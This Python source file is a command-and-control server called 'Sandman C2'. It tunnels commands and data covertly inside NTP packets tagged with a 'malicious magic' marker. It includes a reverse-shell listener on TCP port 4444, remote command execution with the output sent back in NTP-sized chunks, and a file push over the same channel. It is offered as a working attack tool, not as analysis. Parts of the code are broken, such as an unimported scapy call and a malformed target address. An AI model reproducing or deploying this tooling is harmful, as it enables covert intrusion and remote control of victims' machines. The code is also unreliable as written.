#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Sandman C2 Server
Features:
  - NTP Heartbeat (0x1B + IDOV31)
  - Auto-Interface Detection (Ubuntu + Windows Compatible)
  - Hardcoded Logic:
    1. Reverse Shell (TCP Port 4444)
    2. File Search (Multi-Threading Background Execution)
    3. File Upload (GUI Dialog Selection)
  - Multi-Client Support
  - Spoofing Support
  - Debug Mode (Verbose Logging)
"""

import sys
import os
import time
import struct
import socket
import threading
import subprocess
import queue
import ipaddress
import netifaces
from tkinter import Tk, filedialog
from scapy.all import sniff, IP, UDP, NTP

# === CONFIGURATION ===
TARGET_RANGE = "10.10.10.0/24"
INTERFACE = "ens3"              # Fallback
SERVER_HOST = "10.10.10.50"
SERVER_IP = "10.10.10.69"
NTP_PORT = 123
SLEEP = 0.1
CHUNK_SIZE = 48
MALICIOUS_MAGIC = b"IDOV31"
MAGIC_BYTE = 0x1B

# === HARDWARE SOCKETS (Global) ===
tcp_shell_sock = None
tcp_upload_sock = None

# === THREAD POOL FOR SEARCH ===
search_queue = queue.Queue()
def process_search_queue():
    while True:
        try:
            cmd, src_ip, dst_ip, ntp_port = search_queue.get()
            execute_search(cmd, src_ip, dst_ip, ntp_port)
        except Exception as e:
            print(f"[-] Search Thread Error: {e}")
        search_queue.task_done()

def start_search_threads():
    thread = threading.Thread(target=process_search_queue, daemon=True)
    thread.start()

# === PACKET HANDLING ===
def pack_ntp_resp(type_byte, data):
    header = struct.pack('B', type_byte) + MALICIOUS_MAGIC
    header += data[:48]
    return header[:48]

def send_udp_packet(data, src, dst, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (dst, port))
        return True
    except Exception as e:
        print(f"[-] Send Error: {e}")
        return False

# === 1. HARDCODED REVERSE SHELL (TCP 4444) ===
def spawn_reverse_shell(ip_source, ip_dest):
    """Spawn a PowerShell Reverse Shell Listener (Hardcoded TCP Listener)"""
    global tcp_shell_sock
    try:
        print(f"[+] Spawning Reverse Shell Listener on {SERVER_HOST}:4444...")
        tcp_shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_shell_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_shell_sock.bind((SERVER_HOST, 4444))
        tcp_shell_sock.listen(5)
        print(f"[+] TCP Listener Ready: {SERVER_HOST}:4444")
        
        conn, addr = tcp_shell_sock.accept()
        print(f"[+] Client Connected: {addr}")
        
        ack = pack_ntp_resp(MAGIC_BYTE, b"READY")
        send_udp_packet(ack, ip_source, ip_dest, NTP_PORT)
        
        while True:
            time.sleep(SLEEP)
    except Exception as e:
        print(f"[-] Reverse Shell Error: {e}")
        return False
    return True

# === 2. HARDCODED FILE SEARCH (Multi-Threading Background Execution) ===
def execute_search(cmd, src_ip, dst_ip, ntp_port):
    """Execute search command (e.g., 'dir C:\\Temp\\*') in a background thread"""
    try:
        print(f"[+] Executing Search: {cmd}")
        if cmd and cmd.strip() != "CMD":
            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            stdout, stderr = p.communicate()
            
            if stdout:
                print(f"[+] File Search Result: {len(stdout)} bytes")
                for i in range(0, len(stdout), CHUNK_SIZE):
                    chunk = stdout[i:i+CHUNK_SIZE]
                    packet = pack_ntp_resp(MAGIC_BYTE, chunk)
                    send_udp_packet(packet, src_ip, dst_ip, ntp_port)
                    time.sleep(SLEEP)
            
            packet = pack_ntp_resp(MAGIC_BYTE, b"END")
            send_udp_packet(packet, src_ip, dst_ip, ntp_port)
    except Exception as e:
        print(f"[-] Search Error: {e}")

# === 3. HARDCODED FILE UPLOAD (GUI Dialog Selection) ===
def run_file_upload(ip_source, ip_dest, ntp_port=123):
    """Open a TCP Listener for File Upload with GUI Dialog"""
    global tcp_upload_sock
    try:
        tcp_upload_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp_upload_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcp_upload_sock.bind(("0.0.0.0", 8888))
        tcp_upload_sock.listen(5)
        print(f"[+] Opening TCP Upload Listener on Port 8888...")
        
        ack = pack_ntp_resp(MAGIC_BYTE, b"LISTENING")
        send_udp_packet(ack, ip_source, ip_dest, ntp_port)
        
        conn, addr = tcp_upload_sock.accept()
        print(f"[+] Received Upload Request from {addr}")
        
        root = Tk()
        root.withdraw()
        file_path = filedialog.askopenfilename(title="Select File to Upload", initialdir="C:\\")
        root.destroy()
        
        if file_path:
            print(f"[+] Selected File: {file_path}")
            buffer = b""
            with open(file_path, "rb") as f:
                buffer = f.read()
            
            for i in range(0, len(buffer), CHUNK_SIZE):
                chunk = buffer[i:i+CHUNK_SIZE]
                packet = pack_ntp_resp(MAGIC_BYTE, chunk)
                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
                time.sleep(SLEEP)
            
            print(f"[+] Upload Complete: {len(buffer)} bytes")
            packet = pack_ntp_resp(MAGIC_BYTE, b"END")
            send_udp_packet(packet, ip_source, ip_dest, ntp_port)
        else:
            print("[-] No File Selected")
            packet = pack_ntp_resp(MAGIC_BYTE, b"NO_FILE")
            send_udp_packet(packet, ip_source, ip_dest, ntp_port)
        
        while True:
            conn, addr = tcp_upload_sock.accept()
            print(f"[+] Received Upload Request from {addr}")
            root = Tk()
            root.withdraw()
            file_path = filedialog.askopenfilename(title="Select File to Upload", initialdir="C:\\")
            root.destroy()
            if file_path:
                buffer = b""
                with open(file_path, "rb") as f:
                    buffer = f.read()
                
                for i in range(0, len(buffer), CHUNK_SIZE):
                    chunk = buffer[i:i+CHUNK_SIZE]
                    packet = pack_ntp_resp(MAGIC_BYTE, chunk)
                    send_udp_packet(packet, ip_source, ip_dest, ntp_port)
                    time.sleep(SLEEP)
                
                print(f"[+] Upload Complete: {len(buffer)} bytes")
                packet = pack_ntp_resp(MAGIC_BYTE, b"END")
                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
            else:
                packet = pack_ntp_resp(MAGIC_BYTE, b"NO_FILE")
                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
    except Exception as e:
        print(f"[-] File Upload Error: {e}")

# === AUTO-INTERFACE DETECTION (FIXED FOR Ubuntu/Windows) ===
def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
    """Scan all interfaces for the one with traffic to the target range"""
    print(f"[+] Auto-Detecting Interface for Range: {target_range}...")
    
    interfaces = netifaces.interfaces()
    print(f"[+] Found {len(interfaces)} interfaces: {', '.join(interfaces)}")
    
    for iface_name in interfaces:
        print(f"[+] Checking Interface: {iface_name}...")
        try:
            addrs = netifaces.ifaddresses(iface_name)
            ipv4_addrs = addrs.get(2, [])
            
            if ipv4_addrs:
                ips = [addr['addr'] for addr in ipv4_addrs if 'addr' in addr]
                if ips:
                    ip_address = ips[0]
                    print(f"[+] Interface IP: {ip_address}")
                    
                    # 1. Bind socket to the interface IP
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.settimeout(2)
                    sock.bind((ip_address, NTP_PORT))
                    
                    # 2. Send a packet to a reachable IP in the target range
                    target_ip = f"{list(ipaddress.IPv4Network(target_range).network_address)}.{1}"
                    
                    # 3. Send a small packet
                    sock.sendto(b"test", (target_ip, 123))
                    
                    print(f"[+] Found Active Interface: {iface_name} ({ip_address})")
                    return iface_name
                    
        except socket.timeout:
            continue
        except Exception as e:
            print(f"  [!] Error: {e}")
            continue
    
    print(f"[-] No active interface found for {target_range}, using default: {INTERFACE}")
    return INTERFACE

# === MAIN LOOP (Fixed Syntax) ===
def sniff_loop(interface, filter_str, timeout=5):
    sock = None  # Global socket for sniffing
    try:
        print(f"[+] Starting NTP Sniffer on {interface}...")
        print(f"[+] Filter: {filter_str}")
        
        start_search_threads()
        
        while True:
            try:
                # 1. Create raw socket for sniffing
                print(f"[+] Creating raw socket for {interface}...")
                try:
                    # Linux: Use AF_PACKET for raw capture
                    if interface != "lo":
                        # Try AF_PACKET (need root)
                        try:
                            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(123))
                        except socket.error:
                            print(f"  [!] AF_PACKET failed, trying AF_INET fallback...")
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                            sock.bind((SERVER_HOST, NTP_PORT))
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        sock.bind((SERVER_HOST, NTP_PORT))
                    
                    # 2. Set timeout for sniffing
                    sock.settimeout(timeout)
                    
                    # 3. Sniff packet
                    packet = sock.recvfrom(65535)  # 64KB buffer
                    ntp_pkt, src_ip = packet
                    
                    # 4. Check Magic Byte
                    raw = scapy.raw(ntp_pkt)
                    if raw[1:7] == MALICIOUS_MAGIC:
                        # 5. Receive Payload Type
                        connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        connection.bind((SERVER_HOST, NTP_PORT))
                        
                        type_data = connection.recv(6)
                        type_str = type_data.decode().strip()
                        
                        payload_cfg = {
                            "ReverseShell": {"Type": "ReverseShell", "Size": 4096, "Data": b"READY"},
                            "FileSearch": {"Type": "FileSearch", "Size": 4096, "Data": b"QUEUED"},
                            "FileUpload": {"Type": "FileUpload", "Size": 4096, "Data": b"LISTENING"}
                        }
                        
                        size = 4096
                        size_chunk = pack_ntp_resp(MAGIC_BYTE, f"{MAGIC_BYTE}{size}".encode())
                        connection.send(size_chunk)
                        
                        content = payload_cfg.get(type_str, payload_cfg["ReverseShell"])["Data"]
                        for i in range(0, len(content), CHUNK_SIZE):
                            chunk = content[i:i+CHUNK_SIZE]
                            chunk_pkt = pack_ntp_resp(MAGIC_BYTE, chunk)
                            connection.send(chunk_pkt)
                            time.sleep(SLEEP)
                        
                        connection.send(pack_ntp_resp(MAGIC_BYTE, b"\x00"))
                    
                # Inner except for socket errors
                except socket.timeout:
                    print(f"[+] Timeout. Waiting for next packet...")
                    time.sleep(SLEEP)
                except socket.error as e:
                    print(f"  [!] Socket Error: {e}")
                    time.sleep(SLEEP)
                except Exception as e:
                    print(f"  [!] Sniff Packet Error: {e}")
                    time.sleep(SLEEP)
            
            # Outer except for socket reconnection
            except socket.timeout:
                print(f"[+] Outer Timeout. Waiting for next packet...")
                time.sleep(SLEEP)
            except socket.error as e:
                print(f"[-] Outer Socket Error: {e}")
                try:
                    # Try to reconnect
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.bind((SERVER_HOST, NTP_PORT))
                    sock.settimeout(timeout)
                except Exception as e2:
                    print(f"  [!] Reconnect Error: {e2}")
                    time.sleep(SLEEP)
            except Exception as e:
                print(f"[-] Outer Sniff Error: {e}")
                time.sleep(SLEEP)
            finally:
                # Cleanup
                if sock:
                    try:
                        sock.settimeout(timeout)
                    except:
                        pass
                    finally:
                        time.sleep(SLEEP)
    
    finally:
        # Final cleanup
        if sock:
            try:
                sock.close()
                print("[+] Socket closed.")
            except:
                pass

def print_banner():
    print("""
   _____                 _                       
  / ____|               | |                      
 | (___   __ _ _ __   __| |_ __ ___   __ _ _ __  
  \___ \ / _` | '_ \ / _` | '_ ` _ \ / _` | '_ \ 
  ____) | (_| | | | | (_| | | | | | | (_| | | | |
 |_____/ \__,_|_| |_|\__,_|_| |_| |_|\__,_|_| |_|
        Sandman C2 Server
    """)

if __name__ == "__main__":
    print_banner()
    
    # 1. Auto-Detect Interface
    iface = auto_detect_interface(TARGET_RANGE)
    print(f"[+] Selected Interface: {iface}")
    INTERFACE = iface
    
    if len(sys.argv) >= 2:
        INTERFACE = sys.argv[1]
    if len(sys.argv) >= 3:
        NTP_PORT = int(sys.argv[2])
    
    filter_str = f"udp and port {NTP_PORT}"
    print(f"[+] Starting NTP Sniffer on {INTERFACE}...")
    print("[+] Listening for Heartbeats...")
    
    sniff_loop(INTERFACE, filter_str)
